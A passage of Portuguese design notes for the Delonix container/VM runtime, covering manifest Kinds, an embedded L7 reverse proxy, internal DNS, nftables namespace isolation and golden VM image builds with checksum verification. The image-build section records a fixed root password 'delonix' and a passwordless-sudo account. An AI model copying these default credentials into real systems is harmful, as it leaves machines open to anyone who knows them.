reservados (erro com hint dirigido — "usa kind: Pod"/"usa type: vm", nunca silêncio), tipo
desconhecido/em falta ou bloco que não bate com o tipo → erro claro. Zero motor novo, zero daemon,
zero dependência (tudo em `-bin`). Validado ao vivo (dry-run baixa Container+Vm; apply real cria o
container; os 4 caminhos fail-closed em EN e PT). **Por fazer, documentado**: `type: pod`→`kind: Pod`
e `type: microvm` (variante de backend do `vm`), cada um um ADR futuro. Ver `examples/workload.yaml`.

**`delonix workload {ls,stop,rm}` (ADR-0002, Fase 2a, `docs/adr/0002-compute-driver-trait.md`)** —
o lado IMPERATIVO/day-2 da unificação (a criação é declarativa, via `kind: Workload`). Um trait
`ComputeDriver { list, owns, stop, remove }` (`cmd/workload.rs`) com adaptadores `ContainerDriver`/
`VmDriver` que delegam em `cmd::{container,vm}::workload_*` — wrappers finos sobre a lógica de
list/stop/rm JÁ testada dos motores (zero duplicação, zero crate de motor tocado). `workload ls`
mostra containers E VMs numa só tabela (TYPE/NAME/STATUS/INFO); `stop`/`rm` fazem routing por nome
EXACTO, **fail-closed**: zero donos → `no such workload`; um container E uma vm com o mesmo nome →
`ambiguous` (aponta para o comando específico, nunca adivinha). `owner()` é puro sobre a lista de
drivers, testado com drivers falsos. O trait foi feito com um consumidor real de propósito (não
scaffolding morto — o anti-padrão "código à espera do 1.º caller" do `revisor`): cada método tem
caller. **`ensure`/create fica de fora** — criar é `kind: Workload`. **Fase 2b (promover o trait
para o `core` ou um crate `delonix-compute`) só quando houver um 2.º consumidor** (cri/mgmt) — não
antes. Output de uma linha, a espelhar o subcomando nativo (container→id, vm→nome).

**Aproximação ao k8s (4 fatias, todas em main).** (1) **`kind: Container` forma de Pod** —
`spec.containers[]` (k8s) com `env:[{name,value}]`/`ports:[{containerPort,hostPort}]`/`resources.
limits`/`securityContext`/`volumeMounts`+`volumes`, normalizado para o `RunOpts` interno
(`container::pod_to_run_opts`); v1 = 1 container (>1 erro), a forma PLANA continua (back-compat),
detetado por `spec.containers` presente. (2) **`kind: Stack`** agrupa recursos num só doc
(`spec.{networks,volumes,storage,secrets,images,vms,containers,ingress,egress,firewallPolicies,
httpRoutes,dependencies}`), **expandido em `manifest::load`** para os docs individuais em ordem de
dependência (herda a namespace) — o Stack não sobrevive ao load, tudo o resto (apply/ls/describe +
apply por-Kind) vê os filhos. (3) **`kind: Ingress` = Ingress L7 k8s** (ver secção do reverse-proxy;
firewall foi para `FirewallPolicy`). (4) **`stack apply --dry-run`** — `manifest::render_with_
defaults` faz round-trip do spec pelo struct tipado (materializa os `#[serde(default)]`) e imprime
o YAML completo sem aplicar (estilo `kubectl --dry-run=client -o yaml`). Cada grupo expõe um
`pub fn spec_with_defaults(doc) -> serde_yaml::Value` (round-trip pelo seu spec tipado, que tem
`Serialize`); cobre **todos os Kinds** — Network/Volume/Storage/Image/Dependency/Vm/HTTPRoute/
Ingress(k8s)/Egress/FirewallPolicy/Container (flat E Pod-shape, via `pod_spec_with_defaults`). Só
**`Secret`** fica no spec cru de propósito (não reformatar `stringData`). `FwDocSpec` ganhou o campo
`direction` (Option, `skip_serializing_if`) para o round-trip o preservar (o `apply` lê-o do
`doc.spec`). `Metadata`/`ManifestDoc` têm `Serialize` (+ `skip_serializing_if` nos campos vazios).

- **`delonix <container|image|vm|volumes|network> apply [-f ficheiro]`** — aplica só os
  documentos do Kind desse grupo (ignora os outros). Sem `-f`, usa `./delonix-manifest.yaml`
  (erro claro se não existir).
- **`delonix stack apply [-f ficheiro]`** — aplica TODOS os Kinds, por esta ordem (dependência
  por nome): Network → Volume → Image → Vm → Container. **Fail-fast, sem transacionalidade**: o
  que já foi aplicado antes de um erro FICA aplicado (sem rollback).
- **Semântica de `apply`: "garante presente", não um reconciliador.** Sem diffing/rollout/
  drift-detection contínua — isso é trabalho de um orchestrator com controllers (deliberadamente
  fora de escopo aqui; o equivalente privado, `delonix-orchestrator`, fica só no `delonix-paas`).
  Idempotência por Kind: `Network`/`Container` verificam existência por nome antes de criar
  (`store.get`/procura no `Store` por `c.name`); `Volume`/`Vm` já são idempotentes na própria API
  do crate (`VolumeStore::create*`, `delonix_vm::create`); `Image` com `spec.pull` é idempotente
  (`resolve_or_pull`), com `spec.build` reconstrói e substitui a tag a cada `apply` (não há cache
  de build). `kind: Container`'s `spec.detach` tem **default `true`** (diferente do CLI `run`,
  onde é `false`) — um `apply` em primeiro plano bloquearia à espera do processo terminar.
- Exemplo completo de manifesto e o mapeamento spec↔CLI: ver o doc-comment de
  `crates/delonix-runtime-bin/src/cmd/manifest.rs` e o plano desta sessão
  (`/home/walter/.claude/plans/mellow-cuddling-canyon.md`, mantido para referência histórica).

## Reverse-proxy L7 (`kind: HTTPRoute`)

Reverse-proxy HTTP/HTTPS declarativo **embutido**. Roteia por `Host` + prefixo de path para
containers backend. Módulos: `cmd/httproute.rs` (schema `HttpRouteSpec` + resolução + `apply`) e
`cmd/ingress_proxy.rs` (o proxy `hyper` + o ciclo de vida). Superfície: `delonix net httproute
ls/apply/rm` + `kind: HTTPRoute` no `stack apply`.

**`kind: Ingress` = Ingress L7 estilo k8s (BREAKING v0.7.x).** Desde esta série, `kind: Ingress`
é a forma **networking.k8s.io/v1** (`spec.rules[].host` + `http.paths[].backend.service.{name,port.
number}`, `spec.tls[]`, `defaultBackend`, `ingressClassName`) e **compila para o mesmo proxy L7**
(`httproute::ingress_to_httproute`/`ingress_spec_of` → `HttpRouteSpec`; recolhido em
`parse_and_validate` a par do `HTTPRoute`). Limitações herdadas do HTTPRoute: **um só cert (sem
SNI)** — o 1.º `tls[]` decide selfSigned/secretRef; `pathType: Exact` é aceite mas tratado como
prefixo; portas nomeadas dão erro (usa `port.number`). **Migração**: o firewall L4 que ANTES vivia
em `kind: Ingress` passou para **`kind: FirewallPolicy` com `direction: ingress`** (já era alias);
`firewall::apply` deixou de tratar `Ingress` (só `Egress`/`FirewallPolicy`); `validate_graph` e o
drift-guard movidos em conformidade; `examples/firewall.yaml` migrado, `examples/ingress.yaml` é a
nova forma L7. A CLI `delonix net ingress` (publish/allow/deny) **continua L4** — só o *Kind* do
manifesto mudou de significado.

- **O proxy é `hyper` puro** (server http1 + cliente `hyper-util` legacy), **confinado ao bin** —
  `hyper`/`hyper-util`/`tokio`/`tokio-rustls`/`rustls-pemfile`/`rcgen`/`bytes`/`http-body-util` são
  deps do `delonix-runtime-bin`; **já vinham na árvore** (transitivas via `delonix-cri`/`tonic`),
  logo **zero superfície de supply-chain nova** (excepto `rcgen`/`rustls-pemfile`, minúsculas). Os
  crates de motor continuam dep-limpos.
- **Onde corre:** um processo `delonix ingress-proxy` (subcomando OCULTO) lançado **dentro do netns
  do holder** (`infra::infra_join_argv` + `setsid` detached; o `nsenter` faz EXEC → PID estável e
  signalável do host). Aí alcança os backends por IP interno; as portas de entrada publicam-se no
  host via `slirp add_hostfwd` (o proxy escuta `0.0.0.0` e apanha o `SLIRP_IP` — o holder **não tem
  `input` chain**, logo sem DNAT). Infra persistente como o slirp/holder, só existe quando há um
  HTTPRoute — respeita o "daemonless".
- **Reload a quente (SIGHUP):** as rotas vivem numa tabela trocável (`Arc<RwLock<Arc<Vec<Route>>>>`);
  `httproute apply` num proxy vivo reescreve a config e envia SIGHUP → só as ROTAS recarregam (mesmo
  PID, sem downtime). **Listeners e TLS ficam FIXOS no arranque** — mudá-los exige `httproute rm` +
  apply (o apply avisa se detetar mudança de portas). É o substrato do auto-registo de containers.
- **TLS termina no proxy** (`tokio-rustls`, provider `ring`): `spec.tls.mode: selfSigned` (gera um
  cert multi-SAN com `rcgen` cobrindo todos os hosts) ou `secretRef` (lê `tls_crt`/`tls_key` — ou
  `tls.crt`/`tls.key` — de um `kind: Secret`). Limitação v1: **um só cert** (sem selecção por SNI).
- **Resolução:** `httproute::apply` corre por ÚLTIMO no `stack apply` (precisa dos containers já
  criados) e resolve cada `backend.service` → `ip:porta` do record. **Só backends com IP na SDN**
  (numa rede custom) servem — os de `--net host/none` não são alcançáveis pelo proxy; erro claro.
- **Ciclo de vida** (`ensure_running`/`stop`): idempotente (vivo → SIGHUP; morto → spawn + publish),
  com **guarda de identidade do PID** (`/proc/<pid>/cmdline` contém `ingress-proxy`, para um PID
  reciclado não levar SIGHUP/SIGTERM), confirmação de arranque (não declara "a servir" se o proxy
  caiu no bind) e publish idempotente. `httproute rm` mata o proxy + despublica.
- **Segurança:** `host`/`path`/`backend.service` passam por `valid_host`/`valid_path_prefix`/
  `valid_service` antes de qualquer uso; headers **hop-by-hop** (Connection/Transfer-Encoding/
  Upgrade/…) removidos nos dois sentidos (anti-smuggling); timeouts anti-slowloris (handshake TLS,
  header-read, backend→504). **WebSocket/upgrade ainda NÃO é tunelado** (follow-up).
- **Provado E2E** (container `httpd` real numa rede custom): `httproute apply` → proxy no holder →
  `curl host:<porta>` com `Host` header → backend; HTTPS com `curl -k` (TLS negociado, self-signed);
  re-apply recarrega por SIGHUP (mesmo PID); `httproute rm` mata e despublica. Ver `examples/httproute.yaml`.

**Auto-registo de containers (`container run --expose <porta>`) — FEITO.** Um container com
`--expose` é auto-registado no proxy L7 sob o FQDN interno `<nome>.<namespace>.delonix.internal`,
com reload a quente (SIGHUP), removido no `container rm`. A config final compõe-se de DUAS fontes
que **nunca se apagam**: **MANUAL** (`kind: HTTPRoute` → `set_manual`/`manual.json`) + **AUTO**
(`--expose` → `auto_register`/`auto.json`, read-modify-write sob **flock** contra lost-update).
`rebuild()` une as duas → `ensure_running` (ou `stop` se ficou tudo vazio). `httproute rm` limpa só
a parte MANUAL (as auto sobrevivem). As auto-rotas servem-se em **:8080** (não :80 — em rootless o
slirp não publica portas <1024). O `--expose` exige `--net <rede>` (avisa senão) e re-regista no
`start`. Provado E2E: `--expose` → `curl host:8080 -H 'Host: <fqdn>'` → container; múltiplas
auto-rotas + MANUAL coexistem no mesmo proxy. **Limitação**: adicionar uma auto-rota com o proxy JÁ
noutro listener não liga a porta nova (SIGHUP recarrega só rotas — herdado dos listeners-fixos).
Faz do Delonix um substituto do k8s (DNS+ingress) em ambientes pequenos.

## DNS interno / descoberta de serviço (`<nome>.<namespace>.delonix.internal`)

O DNS do holder (`infra::dns_server_main`/`dns_resolve`) resolve nomes de container/VM para o IP
da SDN — descoberta de serviço estilo k8s (CoreDNS), sem nada a configurar. Esquemas:

- **`<nome>`** (simples) e **`<nome>.delonix.io`** (legado) → resolvem o container por nome, em
  QUALQUER namespace (comportamento de sempre, preservado).
- **`<nome>.<namespace>.delonix.internal`** → resolve E **verifica a namespace** (isolamento também
  no DNS: resolver com a namespace errada dá **NXDOMAIN**). `parse_internal_name` (pura, testada)
  separa nome/namespace.
- **Anti-sequestro**: a divisão por namespace só se aplica ao sufixo `.delonix.internal` — um
  domínio EXTERNO (`api.github.com`) **nunca** é sequestrado por um container `api` na ns `github.com`;
  fica como nome-inteiro (não casa) e reencaminha.
- **Provado E2E**: `api.prod.delonix.internal` → IP correcto; `api` simples resolve; namespace
  errada → NXDOMAIN. É a fundação do **auto-registo** (cada container HTTP ganha FQDN + rota no
  proxy — próxima fatia).

## Alcançabilidade dirigida (`kind: Dependency` / `KnowDepends`)

`kind: Dependency` (alias `KnowDepends`) — comunicação **DIRIGIDA** entre containers, ao contrário
da `Network` (bidirecional). `spec: { from, to (escalar ou lista), ports?, proto? }`: `from`
alcança `to`, mas `to` não fica exposta aos outros containers da rede. Caso clássico: a app conhece
a DB, a DB não fica acessível aos outros apps de uma rede partilhada (`cmd/dependency.rs`).

- **Açúcar sobre o firewall L4 por-container** (zero dataplane novo): compila para, no `to`, ingress
  **default-deny** (protege) + um `allow` do IP do `from`. Reutiliza `ContainerFw`/`infra::
  apply_firewall` via `firewall::apply_container_ingress` (helper partilhado). Várias `Dependency`
  para o mesmo `to` **acumulam** os `allow`. O retorno da conversa flui porque a SDN é stateful.
- **Alias de Kind** `KnowDepends`→`Dependency` (`canonical_kind`). Grafo valida `from`/`to` como
  containers; `stack apply` corre-o após o firewall (precisa dos IPs). Ver `examples/dependency.yaml`.
- **Provado E2E**: rede aberta (app E other alcançam db) → após `Dependency app→db`, app OK e other
  BLOQUEADO (timeout).
- **Semântica v1 e limites**: garante "`to` protegido, só os `from` declarados o alcançam". O
  bloqueio do **sentido inverso** (`to` não INICIA para `from`) completa-se com **Namespaces**
  (isolamento default-deny universal — próxima fatia). Um `to` que seja simultaneamente alvo de um
  `kind: Ingress` explícito **e** de `Dependency` avisa (o Dependency é autoritativo e substitui a
  direção de entrada). Remover a `Dependency` **não** desprotege o `to` ("garante presente").

## Isolamento de namespace (`metadata.namespace` / `--namespace`)

Namespace lógico de **isolamento** (default `default`), estilo k8s: containers de namespaces
diferentes **não se alcançam** (mesmo na MESMA rede); só um `kind: Dependency` fura a fronteira,
e num só sentido. Superfície: `container run --namespace <ns>` + `metadata.namespace` no manifesto.
Núcleo em `ContainerFw.namespace` + `infra::fw_chain_body`/`ns_set_join`.

- **Modelo unificado por-container** (decisão de desenho — nftables `accept` não é terminal entre
  base chains, o que impede uma chain `nsdeny` separada de compor com o Dependency): o isolamento
  vive na chain dedicada de CADA container (first-match terminal). Um container fora do `default`
  ganha, na entrada: `ip saddr @dlxns_<ns> accept` (mesma namespace) + `ip saddr @dlxall ct state
  new drop` (dropa NOVAS ligações de containers de OUTRA namespace). O `ct new` isenta o retorno
  (established), e o `@dlxall` limita o drop a fontes-container (gateway/DNS/internet passam).
- **Sets nft**: `@dlxall` (todos os IPs de container) + `@dlxns_<hash>` por namespace, mantidos no
  `do_attach` (`ns_set_join`: remove o IP de qualquer `@dlxns` anterior → re-attach/mudança de ns
  corrige-se sem cleanup no detach). O membership é dinâmico — as regras `@set` avaliam a
  composição actual, sem re-aplicar a chain quando um peer entra.
- **Composição com Dependency/Ingress**: uma política EXPLÍCITA é autoritativa e substitui o
  default de namespace (`has_explicit_in` short-circuita as regras de namespace). Assim um
  `Dependency app→db` fura a parede (allow do IP do app na chain do db) e o **sentido inverso**
  db→app fica bloqueado pela regra de namespace do app — a garantia dirigida que o Dependency
  sozinho não dava.
- **Provado E2E** (bateria de isolação, 4 containers, 2 namespaces): same-ns → OPEN; cross-ns →
  BLOQUEADO (timeout); Dependency fura o cross-ns; sentido inverso bloqueado; retorno flui. O
  `container start` **re-aplica** a firewall persistida (o isolamento sobrevive ao reinício).
- **`default` = SDN aberta** (tudo na mesma namespace) → **comportamento inalterado** para quem não
  usa namespaces. Attach de `default` mantém a forma de 5 tokens do control-line (compat com um
  holder antigo num upgrade in-place; só attaches namespaced exigem o holder novo).
- **Limitações v1 (conhecidas)**: (1) o isolamento **não é reconstruído num respawn do holder** —
  os sets/chains recriam-se vazios e os containers vivos não se re-atacham sozinhos (reiniciar cada
  um repõe); (2) **pods (CRI) e VMs** ainda ficam em `default` (attach por caminhos distintos);
  (3) `default↔não-default` é **assimétrico** (o `default` é o namespace "público" — alcançável de
  dentro de qualquer namespace, mas não alcança para dentro delas). Fechar (1)/(2) é o próximo passo.

## Imagem VM dourada (`delonix image --vm`)

`delonix image --vm ls|pull|push|build` gere imagens VM à parte das imagens de container
(`ImageStore`) — um `.qcow2` solto + `.json` de metadados por imagem, em `<root>/vm-images/`
(`crates/delonix-runtime-bin/src/cmd/vmimage.rs`, `VmImageStore`). Prepara o terreno para
`delonix cluster kubeadm` (secção "Cluster kubeadm" abaixo — já implementado): a imagem já vem
com `kubeadm`/`kubelet`/`kubectl` e o `delonix-cri` a correr como serviço systemd — **arrancar um
nó não faz nenhuma instalação**, só `kubeadm init`/`kubeadm join`.

- **`build`**: descarrega a cloud image Ubuntu (`cloud-images.ubuntu.com/releases/<release>/
  release/`, cache em `<root>/vm-images/_base/`, valida contra `SHA256SUMS` — nunca aceita um
  download sem verificar), achata-a (`qemu-img convert`, sem depender de um backing-file local
  no artefacto final), e corre `virt-customize` com uma lista de passos construída em Rust por
  `k8s_customization_steps()` — **isto é o "100% parametrizado"**: `--extra-package`/
  `--extra-run` estendem sem tocar no código. Instala o repositório `pkgs.k8s.io` +
  `kubeadm`/`kubelet`/`kubectl`, desliga swap, carrega `overlay`/`br_netfilter` + sysctls
  exigidos pelo kubelet/CNI, injecta o binário `delonix-cri` (ver abaixo) + a unit systemd
  (`dist/delonix-cri.service`, `systemctl enable`), e cria a conta padrão pedida: `root`/senha
  `delonix`, utilizador `delonix:delonix` em `sudo` com `NOPASSWD`. cloud-init fica ACTIVO na
  imagem (o build só corre uma vez; o cloud-init do primeiro-boot de CADA VM continua a aplicar
  hostname/SSH-keys — ver `delonix vm create` abaixo). Configura também, em `/etc/bash.bashrc`
  (bash interactivo login E não-login — consola série e SSH), o **autocomplete + alias `k`**
  recomendado pela doc do Kubernetes: `source <(kubectl completion bash)` / `alias k=kubectl` /
  `complete -o default -F __start_kubectl k` / `source <(kubeadm completion bash)` (+ `crictl`),
  cada bloco guardado por `command -v` (inerte se faltar a ferramenta). Fica em
  `common_customization_steps` (partilhado pelos builds online E offline); só toma efeito na
  próxima build/publicação da golden (`vm-image.yml`).
- **Tamanho do artefacto (medido, golden 24.04: 2.38 GiB → 677 MiB, −72%)** — três passos, todos
  no fim do `build`, cada um com uma razão concreta:
  1. **`apt-get clean` + `rm -rf /var/lib/apt/lists/*`** (último `CustomizeOp`, DEPOIS do
     `--extra-run` do utilizador, que pode instalar mais pacotes). Media na golden: `/var/cache/apt`
     ~181 MiB + `/var/lib/apt/lists` ~186 MiB = **~367 MiB de lixo** que enchiam a raiz a **92%**
     (179 MiB livres — perigoso para um nó k8s: o kubelet despeja perto do limite). Depois: 77%,
     546 MiB livres. Fica em `k8s_customization_steps` e **não** em `k8s_recipes` — aquele catálogo
     é PARTILHADO com `cluster apply`, que prepara hosts VIVOS; limpar cache é preocupação do
     ARTEFACTO, não da preparação de um host.
  2. **`virt-sparsify --in-place`** — zera os blocos que a limpeza libertou (sem isto continuam a
     ocupar no qcow2). Best-effort: se falhar, o build segue (só perde tamanho).
  3. **`qemu-img convert -c -o compression_type=zstd`** — a cloud image da Ubuntu **vem comprimida**
     e o `convert` inicial (sem `-c`) descomprime-a; sem este passo o artefacto fica ~4x maior que
     a base (593 MiB → 2.38 GiB). **zstd e não o zlib por omissão**: comprime 5x mais rápido
     (10s vs 53s), fica menor (868 vs 894 MiB no mesmo input), e sobretudo **descomprime** muito
     mais rápido — importa porque a golden é o **backing file read-only** das VMs
     (`delonix_vm::create` faz um overlay qcow2 por VM), logo cada leitura do SO base passa pelo
     descompressor. Escapatória: `--no-compress`. Custo total: ~12s de build.
- **`--offline` (PREFERIR SEMPRE; validado 2026-07-17, build em 1m18s)** — obtém os `.deb` do k8s
  no **HOST** e corre o `virt-customize` com **`--no-network`**. O appliance nunca precisa de
  DHCP/DNS, o que **dispensa os workarounds de host** (passt/dhclient) que o caminho online
  exige — ver "Bloqueio de execução conhecido" abaixo. Validado com o `passt` ATIVO, sem tocar
  no host.
  - **Cadeia de confiança: a MESMA do apt, feita no host em vez do guest** — `InRelease`
    (clearsigned, verificado com `gpgv` contra a `Release.key` do repo, keyring TEMPORÁRIO —
    nunca toca no do utilizador) → SHA256 do índice `Packages` (declarado no InRelease assinado)
    → SHA256 de cada `.deb` (declarado no `Packages` autenticado). **Falha FECHADO** em qualquer
    passo — mesmo princípio do achado CRÍTICO nº3 da auditoria (`pull_oci_artifact` sem digest).
  - **Porque `dpkg -i` chega** (medido, não suposto): o fecho são só **4 `.deb` do repo k8s**
    (`kubeadm`/`kubectl`/`kubelet` + `kubernetes-cni`); as restantes deps do kubelet
    (`iptables`/`mount`/`util-linux`/`libc6`) **já vêm na cloud image**. Se alguma faltar, o
    `dpkg` falha ALTO — nunca deixa o guest meio-instalado.
  - **Armadilha (custou um build)**: `kubernetes-cni` tem versionamento PRÓPRIO (1.7.x), não
    segue o do k8s — o filtro `--k8s-version 1.34` só se aplica aos componentes core
    (`parse_packages_index`, parâmetro `versioned`). Há teste de regressão.
  - As receitas sem rede (swap/módulos/sysctls) são partilhadas tal e qual com o caminho online
    (`k8s_recipes::k8s_config_recipes`) — os dois modos **não divergem**. `k8s_host_recipes()` =
    as 2 de rede + estas, para o `cluster apply` (hosts vivos) continuar a ver o catálogo todo.
  - Equivalência com o online **provada**: mesmos pacotes e mesmo estado de hold —
    `kubeadm`/`kubectl`/`kubelet` `hi` 1.34.9-1.1, `kubernetes-cni` `ii` 1.7.1-1.1.
- **Pré-semear as imagens do `kubeadm` (v0.15.0)** — bug report real (host kaeso-sys-01): um
  `kubeadm init` REAL redescarregava sempre TODAS as imagens core (apiserver/controller-manager/
  scheduler/etcd/coredns/pause) do zero, em CADA VM criada — lento o suficiente para estourar o
  próprio deadline interno do rate-limiter do kubeadm e fazer o `wait-control-plane` falhar a
  meio. **Causa-raiz de fundo**: `delonix_image::registry::pull_from_registry_with_creds`
  descarregava sempre cada blob da rede, mesmo quando o conteúdo exacto já estava no CAS local —
  **corrigido** com um `Cas::has` (já existia, nunca era chamado) antes de cada `GET` de blob;
  sem isto, pré-semear a imagem dourada não adiantava nada (o `delonix-cri` ia redescarregar tudo
  na mesma). Com o fix, `--offline build` passou a: extrair o `kubeadm` do `.deb` já
  descarregado/verificado no HOST (`dpkg-deb -x`, sem instalar), correr `kubeadm config images
  list --kubernetes-version=vX.Y.Z` (sem rede — é uma tabela interna estática do binário; provado
  ao vivo), descarregar cada imagem no HOST através do MESMO `pull_from_registry_with_creds` para
  um `ImageStore` de trabalho, e injectar as suas 4 subpastas (`images`/`layers`/`containers`/
  `blobs`) em `/var/lib/delonix` do convidado via `virt-customize --copy-in` — o mesmo caminho que
  `delonix-cri` já lê em runtime. Melhor esforço em toda a cadeia: uma falha (imagem em falta,
  `dpkg-deb` ausente, etc.) só avisa e segue sem imagens pré-semeadas, nunca chumba o build
  inteiro — um arranque mais lento é sempre melhor que um build partido. **Só no modo
  `--offline`** (o caminho online já corre `apt-get`/pull dentro do convidado, sem o mesmo
  encaixe host-primeiro). Validado ao vivo: `kubeadm config images list` a partir de um `kubeadm`
  extraído (sem instalar) devolveu as 7 imagens reais da v1.34; um `pull_from_registry_with_creds`
  real contra `registry.k8s.io/pause:3.10.1` confirmou o layout do `ImageStore` resultante
  (`images/layers/containers/blobs`) bate exactamente com o que o `--copy-in` espera.
- **`--no-k8s` (v0.16.0) — golden SEM Kubernetes, só `delonix` + rootless pronto a usar.** Fase 1
  de 3 (pedido: Ubuntu 26.04 [já funciona hoje, zero código — `--ubuntu-release 26.04`], Ubuntu
  24.04 sem k8s [este], Debian, Rocky — sequenciamento incremental escolhido explicitamente pelo
  utilizador). `k8s_version: None` **não** era "sem k8s": `k8s_repo_version` cai sempre em
  `stable:/v1.31` e instalava kubeadm/kubelet/kubectl na mesma — não havia forma de desligar.
  `--no-k8s` é um caminho novo (`rootless_customization_steps`), mutuamente exclusivo com
  `--k8s-version`/`--offline`/`--cri-bin` (rejeitado com erro claro, nunca ignorado em silêncio):
  instala os mesmos pacotes rootless que o `install.sh` exige (`slirp4netns`/`uidmap`/`nftables`/
  `iproute2`/`conntrack`), injecta o binário `delonix` (não `delonix-cri` — um shim de CRI para o
  kubelet não serve para nada sem kubelet; sem unidade systemd, o motor é invocado por CLI, não é
  um serviço), configura o intervalo subuid/subgid da conta `delonix` (mesma lógica do
  `ensure_subid` do `install.sh` — sem isto o userns rootless só mapeia 1 uid) e escreve o perfil
  AppArmor `unconfined+userns` (`install.sh:370-381`, necessário em hosts Ubuntu 23.10+ com
  `kernel.apparmor_restrict_unprivileged_userns=1` — sem ele o `unshare(CLONE_NEWUSER)` falha logo
  no arranque). A criação de conta/sudoers/bash-completion/limpeza de apt/reset de machine-id
  continua **partilhada** com o caminho k8s (`shared_account_steps`, extraído de
  `common_customization_steps` sem alterar o output do caminho k8s — só o CRI ficou à parte em
  `install_cri_steps`). Publica em `ghcr.io/angolardevops/delonix-vm-base` (repositório novo,
  tags `ubuntu-24.04`/futuramente `debian-12`/`rocky-9` — sem wiring de omissão em `Pull`/
  `LsRemote` nesta fase, o chamador passa sempre a fonte explícita — **fechado no v0.23.0**, ver
  abaixo). `vm-image.yml` ganhou o input `no_k8s` (boolean) que troca o passo de build/tag/
  repositório de destino. **Por fazer (deliberadamente fora desta fase)**: Rocky (dnf — família de
  gestor de pacotes diferente, o maior salto; feito no v0.18.0), `--offline` para `--no-k8s` (a
  verificação de `.deb` no host é específica do `pkgs.k8s.io`).
- **`--distro debian` (v0.17.0) — Fase 2 de 3.** `download_ubuntu_base` generalizou-se em
  `download_ubuntu_base`/`download_debian_base` por trás de um novo enum `Distro { Ubuntu,
  Debian }` (`--distro`, `clap::ValueEnum`, omissão `ubuntu` — zero mudança de comportamento para
  quem não usa a flag nova). Confirmado ao vivo (não suposto) antes de escrever código: o cloud
  image Debian vive em `cloud.debian.org/images/cloud/<codinome>/latest/debian-<major>-
  genericcloud-amd64.qcow2` (`genericcloud`, não `generic` — kernel só-virtio, cloud-init
  mantido, mais pequeno; o nome do ficheiro usa o NÚMERO MAJOR, o directório usa o CODINOME, sem
  alias numérico — daí `debian_major_version` com uma whitelist explícita
  bullseye/bookworm/trixie, erro claro para o resto) e **publica só `SHA512SUMS` — não
  `SHA256SUMS` de todo** (confirmado com `curl -I`; mesmo formato `<hash>  <ficheiro>`, algoritmo
  diferente) — `hex_sha512_file` novo (mesmo `sha2` já na árvore, zero dependência nova), testado
  contra o vector oficial NIST de `SHA-512("abc")`. O resto do pipeline (`rootless_customization_
  steps`/`shared_account_steps`/`k8s_host_recipes`) já era 100% distro-agnóstico — confirmado
  antes de escrever código: o repositório `pkgs.k8s.io` usa formato de repo "flat" (sem
  codinome/suite no URL), a conta `sudo`/`/etc/bash.bashrc` são convenções idênticas em
  Debian/Ubuntu (mesma linhagem de empacotamento) — por isso o `--distro debian` já funciona com
  E sem `--no-k8s`, sem código extra nenhum para o k8s em si. `VmImage` ganhou `distro:
  Option<String>` (`#[serde(default)]`, metadados antigos continuam válidos); `ubuntu_release`
  manteve o NOME do campo (romper renomeá-lo quebraria `.json` já em disco, que não tem
  `#[serde(default)]` nesse campo) mas agora guarda o identificador de release de QUALQUER distro.
  `vm-image.yml` ganhou `distro`/`debian_release` (só para builds `--no-k8s`, mesmo escopo do
  `no_k8s` da fase anterior). **Limitação conhecida**: o download real do qcow2 Debian (~300-600
  MiB) não foi validado de ponta a ponta neste sandbox — a ligação de saída daqui até
  `cloud.debian.org` mostrou-se muito lenta (confirmado independentemente com `curl` simples, não
  é bug do código); a verificação SHA512 em si está coberta por teste unitário com vector
  conhecido, e o URL/formato do `SHA512SUMS` foi confirmado ao vivo com `curl -I`/`curl` de texto
  (ficheiros pequenos). Uma build `--offline` para Debian não está implementada (mesma razão do
  `--no-k8s`: `download_k8s_debs` já é distro-agnóstico do lado do host, mas não foi testada nesta
  combinação) — só o caminho online e `--no-k8s` foram cobertos nesta fase.
- **`--distro rocky` (v0.18.0) — Fase 3 de 3, a última (dnf/RPM, a família de gestor de pacotes
  mais distante de tudo o resto do código).** Escopo **deliberadamente só `--no-k8s`** — o pedido
  original já enquadrava o Rocky como variante para tenants sem Kubernetes, e `k8s_recipes`
  (repositório `pkgs.k8s.io`, `dpkg -i`/`apt-mark hold`) é apt-only; o RPM equivalente do
  `pkgs.k8s.io` tem URL/GPG diferentes e fica fora desta fase. `cmd_build` rejeita
  `--distro rocky` sem `--no-k8s` com erro claro, em vez de tentar correr `apt-get`/`dpkg` num
  guest dnf.
  - **Cloud image**: confirmado ao vivo (não suposto) contra `dl.rockylinux.org` antes de
    escrever código — `pub/rocky/<major>/images/x86_64/Rocky-<major>-GenericCloud.latest.
    x86_64.qcow2` (árvore diferente da do Debian — sem segmento `images/cloud/`). O `<major>` é
    literal (`8`/`9`/`10`, sem tradução de codinome como o Debian) — `valid_rocky_release`
    valida contra essa whitelist só por UX (erro rápido, claro, antes de qualquer rede); ao
    contrário do `debian_major_version`, não é uma fronteira de segurança (um valor desconhecido
    já falhava em segurança com um 404 do `stream_download`).
  - **Checksum: uma TERCEIRA forma, diferente das outras duas.** Rocky publica um `.CHECKSUM`
    PER-FILE (não uma `SUMS` por directório) no formato BSD `SHA256 (<ficheiro>) = <hash>` —
    confirmado ao vivo, diferente do `<hash>  <ficheiro>` GNU que Ubuntu/Debian usam.
    `parse_bsd_checksum` novo (testado com a linha real capturada ao vivo); SHA256 (não SHA512
    como o Debian), por isso reutiliza `hex_sha256_file` sem alterações.
  - **Nomes de pacote RPM confirmados ao vivo** (não assumidos) contra os próprios listagens do
    repositório Rocky 9 antes de escrever código: `shadow-utils` (não `uidmap`), `iproute` (não
    `iproute2`), `conntrack-tools` (não `conntrack`) — todos em BaseOS/AppStream, **sem EPEL**.
    `nftables`/`slirp4netns` partilham o nome entre as duas famílias.
  - **`shared_account_steps` ganhou um parâmetro `distro`** (branch em 3 pontos, todos
    confirmados ao vivo): o grupo sudo-equivalente é `wheel` no Rocky (não `sudo`, que nem
    existe lá); o ficheiro bash interactivo do sistema é `/etc/bashrc` (não `/etc/bash.bashrc`,
    convenção Debian/Ubuntu); a limpeza de cache de pacotes é `dnf clean all` em vez de
    `apt-get clean && rm -rf /var/lib/apt/lists/*`. Debian/Ubuntu mantêm exactamente o output de
    antes (teste de regressão dedicado).
  - **BUG apanhado ANTES de publicar, não em produção**: o passo do perfil AppArmor
    (`printf ... > /etc/apparmor.d/delonix && (apparmor_parser ... || true)`) só guarda a
    chamada ao `apparmor_parser` com `|| true` — a ESCRITA do ficheiro não tem guarda nenhuma.
    O Rocky/RHEL não tem `/etc/apparmor.d/` (usa SELinux, não AppArmor) — correr este passo lá
    faria o redirect falhar, o `&&` curto-circuitar, e o `RunCommand` inteiro (logo o
